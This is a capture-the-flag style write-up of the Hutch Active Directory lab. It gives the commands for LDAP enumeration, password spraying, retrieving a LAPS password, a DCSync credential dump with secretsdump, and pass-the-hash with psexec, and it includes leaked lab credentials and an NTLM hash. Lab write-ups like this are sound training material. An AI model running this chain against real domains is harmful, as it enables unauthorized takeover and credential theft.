# **HUTCH | PG Practice**

## **C.Rating : Hard**

![image](https://github.com/sec-fortress/sec-fortress.github.io/assets/132317714/f18534d6-daa9-4345-9cc4-69548cdfceab)

***

Running our nmap scan we have:


```bash
# Nmap 7.94SVN scan initiated Thu Jun 13 09:55:09 2024 as: nmap -p- -T4 -v --min-rate=1000 -sCV -oN nmap.txt 192.168.214.122
Nmap scan report for 192.168.214.122
Host is up (0.15s latency).
Not shown: 65515 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
| http-webdav-scan: 
|   Server Type: Microsoft-IIS/10.0
|   WebDAV type: Unknown
|   Server Date: Thu, 13 Jun 2024 08:58:07 GMT
|   Allowed Methods: OPTIONS, TRACE, GET, HEAD, POST, COPY, PROPFIND, DELETE, MOVE, PROPPATCH, MKCOL, LOCK, UNLOCK
|_  Public Options: OPTIONS, TRACE, GET, HEAD, POST, PROPFIND, PROPPATCH, MKCOL, PUT, DELETE, COPY, MOVE, LOCK, UNLOCK
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST COPY PROPFIND DELETE MOVE PROPPATCH MKCOL LOCK UNLOCK PUT
|_  Potentially risky methods: TRACE COPY PROPFIND DELETE MOVE PROPPATCH MKCOL LOCK UNLOCK PUT
|_http-title: IIS Windows Server
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-06-13 08:57:17Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: hutch.offsec0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: hutch.offsec0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        .NET Message Framing
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49674/tcp open  msrpc         Microsoft Windows RPC
49676/tcp open  msrpc         Microsoft Windows RPC
49692/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: HUTCHDC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2024-06-13T08:58:09
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Jun 13 09:58:51 2024 -- 1 IP address (1 host up) scanned in 222.82 seconds
```


Checking port 80 we have a default IIS page

![](https://i.imgur.com/qzWtkMc.png)






Decided to run `enum4linux-ng` also for more enumeration


```bash
enum4linux-ng 192.168.214.122 -L -S -oJ hutch.json

# -L: Get additional info via LDAP/LDAPS
# -S: Get shares via RPC
# -oJ: Writes output to JSON file
```



![](https://i.imgur.com/9vVXGWK.png)


Domain : hutch.offsec | 
DC : HUTCHDC


Enumerating users via `ldapsearch` we have few users


```bash
ldapsearch -x -H ldap://192.168.214.122 -b "DC=hutch,DC=offsec" -s sub "(&(objectclass=user))"  | grep sAMAccountName: | cut -f2 -d" "
```


![](https://i.imgur.com/4y5clqt.png)



```
Guest
rplacidi
opatry
ltaunton
acostello
jsparwell
oknee
jmckendry
avictoria
jfrarey
eaburrow
cluddy
agitthouse
fmcsorley
```



We can also confirm that this users are valid using the `kerbrute` tool


```bash
kerbrute userenum --dc 192.168.214.122 -d hutch.offsec users.txt
```


![](https://i.imgur.com/5ac4Q3H.png)


Performing an ASREPRoasting attack, unfortunately no user has pre-authentication enabled


```bash
GetNPUsers.py hutch.offsec/ -usersfile users.txt -format hashcat -dc-ip 192.168.214.122
```


![](https://i.imgur.com/19LxHwc.png)


Tried to password spray

```bash
crackmapexec smb 192.168.214.122 -u users.txt -p users.txt
```


![](https://i.imgur.com/EVW8zBJ.png)



![](https://i.imgur.com/7YGbvds.png)



However password spraying with an empty password we have this `STATUS_ACCOUNT_DISABLED` message on the guest account



![](https://i.imgur.com/9epKINu.png)


Still couldn't do anything cos we need the administrator password to enable any account, However it took me hours to figure out that some users leave passwords in description, so the below command using `ldapsearch` helped 



```bash
ldapsearch -x -H ldap://192.168.214.122 -b "DC=hutch,DC=offsec" -s sub "(&(objectclass=*))"  | grep description:
```


![](https://i.imgur.com/clUpkSP.png)



We found a password called `CrabSharkJellyfish192`, soooo i decided to password spray and we got a hit at user `fmcsorley`



```bash
netexec smb 192.168.214.122 -u users.txt -p "CrabSharkJellyfish192"
```



![](https://i.imgur.com/BHe29vS.png)


As my own **rule of thumb**, after valid creds i roll up `bloodhound-python` first to get more information on the domain


```bash
bloodhound-python -u 'fmcsorley' -p 'CrabSharkJellyfish192' -ns 192.168.214.122 -d hutch.offsec -c all
```



![](https://i.imgur.com/m6X2Wqr.png)



Also just so we don't miss anything let us check if this user has access to any shares


```bash
smbmap -H 192.168.214.122 -u fmcsorley -p CrabSharkJellyfish192
```



![](https://i.imgur.com/d4Dj05m.png)




However enumerating the shares i couldn't find anything valid so i  ran back to bloodhound, loaded my data and found out the user `fmcsorley` can read the **Local Administrator Password Solution** (LAPS) which **provides management of local account passwords of domain joined computers**.


![](https://i.imgur.com/Gg6lUsf.png)


To abuse this we can use the [pyLAPS](https://github.com/p0dalirius/pyLAPS) tool to retrieve credentials



```bash
./pyLAPS.py --action get -d "hutch.offsec" -u "fmcsorley" -p "CrabSharkJellyfish192" --dc-ip 192.168.214.122
```



![](https://i.imgur.com/jDxoPEq.png)


Now let see if this password works for the administrator user, hehe


```bash
netexec smb 192.168.198.122 -u administrator -p "{2[i2Nae6IjQDF" -d hutch.offsec
```


![](https://i.imgur.com/k3ALru1.png)


> I am so sorry the password above is different same as the IP, the lab got stopped and all things where rotated



We have a hit on the administrator and it looks like we are domain admin, we can still take a step further and perform the DCSync attack to replicate the DC and dump all users hash


```bash
secretsdump.py 'hutch.offsec'/'administrator'@192.168.198.122                
# Impacket v0.9.16-dev - Copyright 2002-2017 Core Security Technologies      
                                                                                                                                                                                             
# Password:
```



![](https://i.imgur.com/7Itac4o.png)


Then pass-the-hash for the admin user and get all flags


```bash
psexec.py administrator@192.168.198.122 -hashes aad3b435b51404eeaad3b435b51404ee:0ae9bb132b0b7c3722b7ba682d966e7a
```



![](https://i.imgur.com/9GGwfBp.png)


## What did I learn ?


- First of, I need to start building a methodology for attacking AD, Point is, i missed the **"password in description"**, took me hours to figure it out and finally got it from a friend, this same thing also happened in **Dante**, THE LITTLE THINGS MATTER
- Secondly this lab was quite easy and straight forward BTW, cos' it is AD, hehe, soooo start learning **active directory penetration testing**!



Have fun 🤤


![](https://i.pinimg.com/originals/ca/26/2e/ca262e0354eea311c41134c3e4bc3bc2.gif)


<button onclick="window.location.href='https://sec-fortress.github.io';">Back To Home螥</button>
